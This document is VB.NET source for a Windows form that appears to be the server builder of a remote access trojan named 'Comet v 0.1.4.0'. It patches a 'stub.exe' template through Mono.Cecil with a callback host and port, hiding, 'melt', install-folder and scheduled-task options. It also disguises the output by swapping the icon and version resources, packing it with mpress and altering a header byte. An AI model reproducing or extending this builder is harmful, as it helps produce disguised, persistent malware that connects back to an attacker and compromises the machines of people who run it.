Imports System.IO
Imports System.CodeDom.Compiler
Imports System.Runtime.InteropServices
Imports System.Security
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Public Class Form3
    Dim bln1, bln2, bln3, bln4, bln5 As Boolean
    Dim text1, text2 As String
    'Const spl = "abccba"
    Public STUB As String
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        TextBox3.Text = RandomVariable(20, 70)
    End Sub



    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        'Dim s As New SaveFileDialog
        's.Filter = "Excutable *.exe | *.exe"
        's.FileName = "C:\"
        'If s.ShowDialog = DialogResult.OK Then

        TextBox1.AutoCompleteCustomSource.Add(TextBox1.Text)
        TextBox2.AutoCompleteCustomSource.Add(TextBox2.Text)
        TextBox5.AutoCompleteCustomSource.Add(TextBox5.Text)
        TextBox13.AutoCompleteCustomSource.Add(TextBox13.Text)
        TextBox8.AutoCompleteCustomSource.Add(TextBox8.Text)
        TextBox12.AutoCompleteCustomSource.Add(TextBox12.Text)
        TextBox7.AutoCompleteCustomSource.Add(TextBox7.Text)
        'Dim ofd As New OpenFileDialog
        'With ofd
        '    .Filter = "STUB (.exe)|*.exe"
        '    If (.ShowDialog = DialogResult.OK) Then
        '        STUB = .FileName
        '    Else
        '        Exit Sub
        '    End If
        'End With






        STUB = "stub.exe"


        Dim asm As AssemblyDefinition = AssemblyDefinition.ReadAssembly(STUB)
        Dim tdf As TypeDefinition
        For Each tdf In asm.MainModule.GetTypes
            Dim mdf As MethodDefinition
            For Each mdf In tdf.Methods
                If (mdf.Name = ".cctor") Then
                    Dim enm As IEnumerator(Of Instruction) = Nothing
                    Try
                        enm = mdf.Body.Instructions.GetEnumerator
                        Do While enm.MoveNext
                            Dim current As Instruction = enm.Current
                            If (current.OpCode.Code = Code.Ldstr) Then
                                Dim strings As String = current.Operand.ToString
                                If (strings = "[x1]") Then current.Operand = TextBox1.Text
                                If (strings = "[x2]") Then current.Operand = TextBox2.Text
                                If (strings = "[x3]") Then current.Operand = TextBox5.Text
                                If (strings = "[x4]") Then current.Operand = CheckBox1.Checked.ToString
                                If (strings = "[x5]") Then current.Operand = TextBox4.Text
                                If (strings = "[x6]") Then current.Operand = CheckBox2.Checked.ToString
                                If (strings = "[x7]") Then current.Operand = TextBox6.Text
                                If (strings = "[x8]") Then current.Operand = CheckBox3.Checked.ToString
                                If (strings = "[x9]") Then current.Operand = "0123"
                                If (strings = "[x10]") Then current.Operand = CheckBox5.Checked.ToString
                                If (strings = "[x11]") Then current.Operand = CheckBox6.Checked.ToString
                                If (strings = "[x12]") Then current.Operand = CheckBox7.Checked.ToString
                                If (strings = "[x13]") Then current.Operand = CheckBox8.Checked.ToString
                                If (strings = "[x14]") Then current.Operand = CheckBox9.Checked.ToString
                                If (strings = "[x15]") Then current.Operand = CheckBox10.Checked.ToString
                                If (strings = "[x16]") Then current.Operand = CheckBox11.Checked.ToString
                                If (strings = "[x17]") Then current.Operand = CheckBox12.Checked.ToString
                                If (strings = "[x18]") Then current.Operand = TextBox3.Text
                                If (strings = "[x19]") Then current.Operand = CheckBox13.Checked.ToString
                                If (strings = "[x20]") Then current.Operand = TextBox10.Text
                                If (strings = "[x21]") Then current.Operand = CheckBox2.Checked.ToString
                                If (strings = "[x22]") Then current.Operand = ComboBox1.Text
                                If (strings = "[x23]") Then current.Operand = CheckBox15.Checked.ToString
                                If (strings = "[x24]") Then current.Operand = dta.Checked.ToString
                                If (strings = "[x25]") Then current.Operand = css.Checked.ToString
                                If (strings = "[x26]") Then current.Operand = tcs.Text
                                If (strings = "[x27]") Then current.Operand = TextBox9.Text
                                If (strings = "[x28]") Then current.Operand = flder.Text
                                If (strings = "[x29]") Then current.Operand = hidme.Checked.ToString
                                If (strings = "[x30]") Then current.Operand = melt.Checked.ToString
                                If (strings = "[x31]") Then current.Operand = UDX.temp1.Checked.ToString
                                If (strings = "[x32]") Then current.Operand = UDX.temp2.Checked.ToString
                                If (strings = "[x33]") Then current.Operand = UDX.tr1.Text
                                If (strings = "[x34]") Then current.Operand = UDX.sys1.Checked.ToString
                                If (strings = "[x35]") Then current.Operand = UDX.sys2.Checked.ToString
                                If (strings = "[x36]") Then current.Operand = UDX.tr2.Text
                                If (strings = "[x37]") Then current.Operand = CheckBox25.Checked.ToString
                                If (strings = "[x38]") Then current.Operand = CheckBox16.Checked.ToString
                                If (strings = "[x39]") Then current.Operand = CheckBox17.Checked.ToString
                                If (strings = "[x40]") Then current.Operand = CheckBox18.Checked.ToString
                                If (strings = "[x41]") Then current.Operand = CheckBox19.Checked.ToString
                                If (strings = "[x42]") Then current.Operand = CheckBox20.Checked.ToString
                                If (strings = "[x43]") Then current.Operand = CheckBox21.Checked.ToString
                                If (strings = "[x44]") Then current.Operand = CheckBox22.Checked.ToString
                                If (strings = "[x45]") Then current.Operand = CheckBox23.Checked.ToString
                                If (strings = "[x46]") Then current.Operand = CheckBox24.Checked.ToString
                                If (strings = "[x47]") Then current.Operand = CheckBox26.Checked.ToString
                                If (strings = "[x48]") Then current.Operand = CheckBox31.Checked.ToString
                                If (strings = "[x49]") Then current.Operand = TextBox11.Text
                                If (strings = "[x50]") Then current.Operand = CheckBox32.Checked.ToString
                                If (strings = "[x51]") Then current.Operand = CheckBox28.Checked.ToString
                                If (strings = "[x52]") Then current.Operand = TextBox13.Text
                                If (strings = "[x53]") Then current.Operand = TextBox8.Text
                                If (strings = "[x54]") Then current.Operand = TextBox12.Text
                                If (strings = "[x55]") Then current.Operand = TextBox7.Text
                                If (strings = "[x56]") Then current.Operand = CheckBox30.Checked.ToString
                                If (strings = "[x57]") Then current.Operand = CheckBox33.Checked.ToString
                                If (strings = "[x58]") Then current.Operand = TextBox14.Text
                                If (strings = "[x59]") Then current.Operand = CheckBox34.Checked.ToString
                                If (strings = "[x60]") Then current.Operand = CheckBox36.Checked.ToString
                                If (strings = "[x61]") Then current.Operand = CheckBox37.Checked.ToString
                                If (strings = "[x62]") Then current.Operand = CheckBox38.Checked.ToString
                                If (strings = "[x63]") Then current.Operand = TextBox15.Text
                                If (strings = "[x64]") Then current.Operand = CheckBox39.Checked.ToString
                                If (strings = "[x65]") Then current.Operand = CheckBox40.Checked.ToString
                                If (strings = "[x66]") Then current.Operand = TextBox16.Text

                            End If
                        Loop
                    Finally
                        enm.Dispose()
                    End Try
                End If
            Next
        Next

        Dim sfd As New SaveFileDialog
        With sfd
            .Filter = "(.exe) |*.exe"


            .FileName = Form1.TextBox1.Text
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                asm.Write(.FileName)
                'MsgBox("Server Informations Done", vbInformation)










































                System.IO.File.WriteAllBytes(Application.StartupPath & "\res.exe", My.Resources.Res)
                Dim Version = New Collections.Generic.Dictionary(Of String, String) : Version.Add("CompilerVersion", "v3.4")
                Dim Compiler As VBCodeProvider = New VBCodeProvider(Version)
                Dim cResults As CompilerResults
                Dim Options As New CompilerParameters()
                With Options
                    .GenerateExecutable = True
                    .OutputAssembly = Application.StartupPath & "\AssemblyChange.exe"
                    .CompilerOptions = "/target:winexe"
                    .ReferencedAssemblies.Add("System.dll")
                    .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                    .MainClass = "X"
                End With
                Dim otherfile As String = Application.StartupPath & "\AssemblyChange.exe"
                Dim resfile As String = Application.StartupPath & "\assemblychange.res"
                Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -extract " & otherfile & "," & resfile & ",VERSIONINFO,,", AppWinStyle.Hide)
                Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -delete " & .FileName & "," & System.AppDomain.CurrentDomain.BaseDirectory() + "res.exe" & ",VERSIONINFO,,", AppWinStyle.Hide)
                Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & .FileName & "," & .FileName & "," & resfile & ",VERSIONINFO,1,", AppWinStyle.Hide)
                If Not PictureBox1.Image Is Nothing Then
                    Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & .FileName & ", " & .FileName & ", " & PictureBox1.Tag.ToString & ", " & "icongroup, 1,0", AppWinStyle.Hide)
                    'Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & sfd.FileName & ", " & sfd.FileName & ", " & Application.StartupPath & "\ico.ico, icongroup, 1,0", AppWinStyle.Hide)
                End If
                Try
B:
                    If File.Exists(Application.StartupPath & "\AssemblyChange.exe") Then File.Delete(Application.StartupPath & "\AssemblyChange.exe")
                    If File.Exists(Application.StartupPath & "\assemblychange.res") Then File.Delete(Application.StartupPath & "\assemblychange.res")
                    If File.Exists(Application.StartupPath & "\res.exe") = True Then File.Delete(Application.StartupPath & "\res.exe")
                    If File.Exists(Application.StartupPath & "\res.log") = True Then File.Delete(Application.StartupPath & "\res.log")
                    If File.Exists(Application.StartupPath & "\res.ini") = True Then File.Delete(Application.StartupPath & "\res.ini")
                Catch
                    GoTo B
                End Try

          




            End If

                'If TextBox9.Text = "" Then
                'End If
                If CheckBox4.Checked = True Then
                    Dim P$ = " " + .FileName
                    Dim Px$ = "IOS\mpress.exe"
                    Shell(Px + P)
                End If




            If CheckBox35.Checked = True Then
                Dim App As New FileStream(.FileName, FileMode.Open, FileAccess.Write)
                App.Seek(244, SeekOrigin.Begin)
                App.WriteByte(11)
                App.Flush()
                App.Close()

            End If





                Dim HH$ = "Host : " + TextBox1.Text & vbNewLine + "Port : " + TextBox2.Text & vbNewLine + "File : " + .FileName
            MessageBox.Show(HH, "Comet v 0.1.4.0", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Me.Hide()



            'End If
        End With
    End Sub



    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        UDX.ShowDialog()
    End Sub
    Private Sub CheckBox31_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox31.CheckedChanged
        If CheckBox31.Checked = True Then
            TextBox11.Enabled = True
        Else

            TextBox11.Enabled = False
        End If
    End Sub

    Private Sub css_CheckedChanged(sender As Object, e As EventArgs) Handles css.CheckedChanged
        If css.Checked = True Then
            UDX.temp2.Checked = False
            UDX.sys2.Checked = False
        Else

        End If
    End Sub

    Private Sub CheckBox27_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox27.CheckedChanged
        If CheckBox27.Checked Then
            CheckBox39.Checked = True
            CheckBox35.Checked = True
            CheckBox5.Checked = True
            CheckBox7.Checked = True
            CheckBox8.Checked = True
            CheckBox9.Checked = True
            CheckBox10.Checked = True
            CheckBox11.Checked = True
            CheckBox15.Checked = True
            CheckBox16.Checked = True
            CheckBox17.Checked = True
            CheckBox18.Checked = True
            CheckBox19.Checked = True
            CheckBox20.Checked = True
            CheckBox21.Checked = True
            CheckBox22.Checked = True
            CheckBox23.Checked = True
            CheckBox24.Checked = True
            CheckBox26.Checked = True
        Else
            CheckBox39.Checked = False
            CheckBox35.Checked = False
            CheckBox5.Checked = False
            CheckBox7.Checked = False
            CheckBox8.Checked = False
            CheckBox9.Checked = False
            CheckBox10.Checked = False
            CheckBox11.Checked = False
            CheckBox15.Checked = False
            CheckBox16.Checked = False
            CheckBox17.Checked = False
            CheckBox18.Checked = False
            CheckBox19.Checked = False
            CheckBox20.Checked = False
            CheckBox21.Checked = False
            CheckBox22.Checked = False
            CheckBox23.Checked = False
            CheckBox24.Checked = False
            CheckBox26.Checked = False
        End If
    End Sub
    Private Sub CheckBox32_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox32.CheckedChanged
        If CheckBox32.Checked = True Then
            Panel10.Enabled = True
        Else
            Panel10.Enabled = False
        End If
    End Sub

    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        PictureBox4.Hide()
        PictureBox3.Show()
        CheckBox32.Checked = False
    End Sub

    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        PictureBox4.Show()
        PictureBox3.Hide()
        CheckBox32.Checked = True
    End Sub

    Private Sub PictureBox6_Click(sender As Object, e As EventArgs) Handles PictureBox6.Click
        PictureBox6.Hide()
        PictureBox7.Show()
        hidme.Checked = True
    End Sub

    Private Sub PictureBox7_Click(sender As Object, e As EventArgs) Handles PictureBox7.Click
        PictureBox6.Show()
        PictureBox7.Hide()
        hidme.Checked = False
    End Sub

    Private Sub PictureBox6_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox6.MouseUp
        PictureBox6.Hide()
        PictureBox7.Show()
        hidme.Checked = True
    End Sub

    Private Sub PictureBox7_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox7.MouseUp
        PictureBox6.Show()
        PictureBox7.Hide()
        hidme.Checked = False
    End Sub

    Private Sub PictureBox8_Click(sender As Object, e As EventArgs) Handles PictureBox8.Click
        PictureBox8.Hide()
        PictureBox9.Show()
        melt.Checked = True
    End Sub

    Private Sub PictureBox9_Click(sender As Object, e As EventArgs) Handles PictureBox9.Click
        PictureBox8.Show()
        PictureBox9.Hide()
        melt.Checked = False
    End Sub

    Private Sub PictureBox8_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox8.MouseUp
        PictureBox8.Hide()
        PictureBox9.Show()
        melt.Checked = True
    End Sub

    Private Sub PictureBox9_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox9.MouseUp
        PictureBox8.Show()
        PictureBox9.Hide()
        melt.Checked = False
    End Sub

    Private Sub PictureBox10_Click(sender As Object, e As EventArgs) Handles PictureBox10.Click
        PictureBox10.Hide()
        PictureBox11.Show()
        CheckBox13.Checked = True
    End Sub

    Private Sub PictureBox11_Click(sender As Object, e As EventArgs) Handles PictureBox11.Click
        PictureBox10.Show()
        PictureBox11.Hide()
        CheckBox13.Checked = False
    End Sub

    Private Sub PictureBox10_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox10.MouseUp
        PictureBox10.Hide()
        PictureBox11.Show()
        CheckBox13.Checked = True
    End Sub

    Private Sub PictureBox11_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox11.MouseUp
        PictureBox10.Show()
        PictureBox11.Hide()
        CheckBox13.Checked = False
    End Sub

    Private Sub CheckBox18_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox18.CheckedChanged

    End Sub

    Private Sub Form3_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'Me.Location = New System.Drawing.Size(250, 10)
        Label23.Hide()
        pp2.Height = 0
        pp3.Height = 0
        rdc.Height = 0
        'rdc.Height = 0
        pp5.Height = 0
        bln1 = True
        TextBox2.Text = My.Settings.port
    End Sub

    Private Sub TabPage1_Click(sender As Object, e As EventArgs) Handles TabPage1.Click

    End Sub

    Private Sub PictureBox12_Click(sender As Object, e As EventArgs) Handles PictureBox12.Click
        PictureBox12.Hide()
        PictureBox13.Show()
        CheckBox2.Checked = True
    End Sub

    Private Sub PictureBox13_Click(sender As Object, e As EventArgs) Handles PictureBox13.Click
        PictureBox12.Show()
        PictureBox13.Hide()
        CheckBox2.Checked = False
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            Panel11.Enabled = True
        Else
            Panel11.Enabled = False
        End If
    End Sub



    Private Sub PictureBox16_Click(sender As Object, e As EventArgs) Handles PictureBox16.Click
        PictureBox16.Hide()
        PictureBox17.Show()
        Panel2.Enabled = True
        CheckBox28.Checked = True
    End Sub

    Private Sub PictureBox17_Click(sender As Object, e As EventArgs) Handles PictureBox17.Click
        PictureBox16.Show()
        PictureBox17.Hide()
        Panel2.Enabled = False
        CheckBox28.Checked = False
    End Sub

    Private Sub PictureBox18_Click(sender As Object, e As EventArgs) Handles PictureBox18.Click
        PictureBox18.Hide()
        PictureBox19.Show()
        Panel1.Enabled = True
        CheckBox31.Checked = True
    End Sub

    Private Sub PictureBox19_Click(sender As Object, e As EventArgs) Handles PictureBox19.Click
        PictureBox18.Show()
        PictureBox19.Hide()
        Panel1.Enabled = False
        CheckBox31.Checked = False
    End Sub

    Private Sub PictureBox20_Click(sender As Object, e As EventArgs) Handles PictureBox20.Click
        PictureBox20.Hide()
        PictureBox21.Show()
        pp0.Enabled = True
    End Sub

    Private Sub PictureBox21_Click(sender As Object, e As EventArgs) Handles PictureBox21.Click
        PictureBox20.Show()
        PictureBox21.Hide()
        pp0.Enabled = False
    End Sub

    Private Sub TextBox7_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub TextBox3_MouseMove(sender As Object, e As MouseEventArgs) Handles TextBox3.MouseMove
        On Error Resume Next
        TextBox3.Text = RandomVariable(20, 70)
    End Sub

    Private Sub TextBox3_TextChanged(sender As Object, e As EventArgs) Handles TextBox3.TextChanged

    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        PictureBox5.Show()
        PictureBox2.Hide()
        Panel9.Enabled = True
    End Sub

    Private Sub PictureBox5_Click(sender As Object, e As EventArgs) Handles PictureBox5.Click
        PictureBox5.Hide()
        PictureBox2.Show()
        Panel9.Enabled = False
    End Sub

    Private Sub RadioButton1_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton1.CheckedChanged
        If RadioButton1.Checked = True Then
            UDX.sys2.Checked = False
            UDX.temp2.Checked = False
            LinkLabel1.Enabled = False
        Else
            LinkLabel1.Enabled = True
        End If
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Form21.Show()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If Label23.Text = "1" Then
            Dim Remote$ = "IOS\ico\1.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "2" Then
            Dim Remote$ = "IOS\ico\2.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "3" Then
            Dim Remote$ = "IOS\ico\3.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "4" Then
            Dim Remote$ = "IOS\ico\4.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "5" Then
            Dim Remote$ = "IOS\ico\5.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "6" Then
            Dim Remote$ = "IOS\ico\6.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "7" Then
            Dim Remote$ = "IOS\ico\7.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "8" Then
            Dim Remote$ = "IOS\ico\8.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "9" Then
            Dim Remote$ = "IOS\ico\9.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "10" Then
            Dim Remote$ = "IOS\ico\10.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "11" Then
            Dim Remote$ = "IOS\ico\11.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "12" Then
            Dim Remote$ = "IOS\ico\12.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "13" Then
            Dim Remote$ = "IOS\ico\13.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "14" Then
            Dim Remote$ = "IOS\ico\14.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "15" Then
            Dim Remote$ = "IOS\ico\15.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "16" Then
            Dim Remote$ = "IOS\ico\16.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "17" Then
            Dim Remote$ = "IOS\ico\17.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
        If Label23.Text = "18" Then
            Dim Remote$ = "IOS\ico\18.ico"
            PictureBox1.Image = Image.FromFile(Remote) : PictureBox1.Tag = Remote
            Timer1.Enabled = False
        End If
    End Sub

    Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        PictureBox1.Image = Nothing
    End Sub

    Private Sub LinkLabel3_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel3.LinkClicked
        Dim ofd As New OpenFileDialog With {.Filter = "Icon File (*.ico) |*.ico"}
        If ofd.ShowDialog = DialogResult.OK Then
            PictureBox1.Image = Image.FromFile(ofd.FileName) : PictureBox1.Tag = ofd.FileName
        End If
    End Sub

    Private Sub tt1_Tick(sender As Object, e As EventArgs) Handles tt1.Tick
        If pp2.Height = 0 And pp3.Height = 0 And rdc.Height = 0 And rdc.Height = 0 And pp5.Height = 0 Then
            If bln1 = True Then
                If pp1.Height < 290 Then
                    pp1.Height = pp1.Height + 5
                End If
            Else
                If pp1.Height > 0 Then
                    pp1.Height = pp1.Height - 10
                End If
            End If
        End If
    End Sub

    Private Sub tt2_Tick(sender As Object, e As EventArgs) Handles tt2.Tick
        If pp1.Height = 0 And pp3.Height = 0 And rdc.Height = 0 And rdc.Height = 0 And pp5.Height = 0 Then
            If bln2 = True Then
                If pp2.Height < 290 Then
                    pp2.Height = pp2.Height + 5
                End If
            Else
                If pp2.Height > 0 Then
                    pp2.Height = pp2.Height - 10
                End If
            End If
        End If
    End Sub

    Private Sub tt3_Tick(sender As Object, e As EventArgs) Handles tt3.Tick
        If pp1.Height = 0 And pp2.Height = 0 And rdc.Height = 0 And rdc.Height = 0 And pp5.Height = 0 Then
            If bln3 = True Then
                If pp3.Height < 200 Then
                    pp3.Height = pp3.Height + 5
                End If
            Else
                If pp3.Height > 0 Then
                    pp3.Height = pp3.Height - 10
                End If
            End If
        End If
    End Sub

    Private Sub tt4_Tick(sender As Object, e As EventArgs) Handles tt4.Tick
        If pp1.Height = 0 And pp2.Height = 0 And pp3.Height = 0 And pp5.Height = 0 Then
            If bln4 = True Then
                If rdc.Height < 430 Then  ''''''''''
                    rdc.Height = rdc.Height + 5
                End If
            Else
                If rdc.Height > 0 Then
                    rdc.Height = rdc.Height - 10
                End If
            End If
        End If
    End Sub


    Private Sub lbl1()
        tt1.Enabled = True
        If bln1 = False Then
            bln2 = False
            bln3 = False
            bln5 = False
            bln4 = False
            bln1 = True
        Else
            bln1 = False
        End If
    End Sub

    Private Sub lbl2()
        tt2.Enabled = True
        If bln2 = False Then
            bln1 = False
            bln3 = False
            bln5 = False
            bln4 = False
            bln2 = True
        Else
            bln2 = False
        End If
    End Sub
    Private Sub lbl3()
        tt3.Enabled = True
        If bln3 = False Then
            bln1 = False
            bln2 = False
            bln4 = False
            bln5 = False
            bln3 = True
        Else
            bln3 = False
        End If
    End Sub
    Private Sub lbl4()
        tt4.Enabled = True
        If bln4 = False Then
            bln1 = False
            bln2 = False
            bln3 = False
            bln5 = False
            bln4 = True
        Else
            bln4 = False
        End If
    End Sub
    Private Sub lbl5()
        tt5.Enabled = True
        If bln5 = False Then
            bln1 = False
            bln2 = False
            bln3 = False
            bln4 = False
            bln5 = True
        Else
            bln5 = False
        End If
    End Sub
    Private Sub qq1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles qq1.LinkClicked
        lbl1()
    End Sub

    Private Sub qq2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles qq2.LinkClicked
        lbl2()
    End Sub

    Private Sub qq3_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles qq3.LinkClicked
        lbl3()
    End Sub

    Private Sub qq4_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles qq4.LinkClicked
        lbl4()
    End Sub
    Private Sub CheckBox29_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox29.CheckedChanged
        If CheckBox29.Checked = True Then
            TextBox7.Enabled = True
            TextBox7.Text = "C:\Folder"
        Else
            TextBox7.Text = ""
            TextBox7.Enabled = False
        End If
    End Sub

    Private Sub CheckBox30_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox30.CheckedChanged
        If CheckBox30.Checked = True Then
            TextBox8.Text = "mo 1"
            Label7.Text = "Every minute"
        Else
            TextBox8.Text = "ST 09:39"
            Label7.Text = "Every day"
        End If
    End Sub

    Private Sub CheckBox33_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox33.CheckedChanged
        If CheckBox33.Checked = True Then
            TextBox14.Enabled = True
        Else
            TextBox14.Enabled = False
        End If
    End Sub

    Private Sub PictureBox14_Click(sender As Object, e As EventArgs) Handles PictureBox14.Click
        PictureBox14.Hide()
        PictureBox15.Show()
        CheckBox34.Checked = True
    End Sub

    Private Sub PictureBox14_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox14.MouseUp
        PictureBox14.Hide()
        PictureBox15.Show()
        CheckBox34.Checked = True
    End Sub

    Private Sub PictureBox15_Click(sender As Object, e As EventArgs) Handles PictureBox15.Click
        PictureBox15.Hide()
        PictureBox14.Show()
        CheckBox34.Checked = False
    End Sub

    Private Sub PictureBox15_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox15.MouseUp
        PictureBox15.Hide()
        PictureBox14.Show()
        CheckBox34.Checked = False
    End Sub

    Private Sub tt5_Tick(sender As Object, e As EventArgs) Handles tt5.Tick
        If pp1.Height = 0 And pp2.Height = 0 And pp3.Height = 0 And rdc.Height = 0 Then
            If bln5 = True Then
                If pp5.Height < 390 Then  ''''''''''
                    pp5.Height = pp5.Height + 5
                End If
            Else
                If pp5.Height > 0 Then
                    pp5.Height = pp5.Height - 10
                End If
            End If
        End If
    End Sub

    Private Sub qq5_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub LinkLabel4_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles qq5.LinkClicked
        lbl5()
    End Sub

    Private Sub FlowLayoutPanel1_Paint(sender As Object, e As PaintEventArgs) Handles FlowLayoutPanel1.Paint

    End Sub

    Private Sub CheckBox37_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox37.CheckedChanged
        If CheckBox37.Checked = True Then
            CheckBox36.Checked = False

        End If
    End Sub

    Private Sub CheckBox36_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox36.CheckedChanged
        If CheckBox36.Checked = True Then
            CheckBox37.Checked = False

        End If
    End Sub

    Private Sub CheckBox38_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox38.CheckedChanged
        If CheckBox38.Checked = True Then
            Panel5.Enabled = True
        Else
            Panel5.Enabled = False
        End If
    End Sub

    Private Sub CheckBox39_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox39.CheckedChanged

    End Sub

    Private Sub CheckBox40_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox40.CheckedChanged
        If CheckBox40.Checked = True Then
            Panel6.Enabled = True
        Else
            Panel6.Enabled = False
        End If
    End Sub

    Private Sub VisualStudioGroupBox2_Click(sender As Object, e As EventArgs) Handles VisualStudioGroupBox2.Click

    End Sub
End Class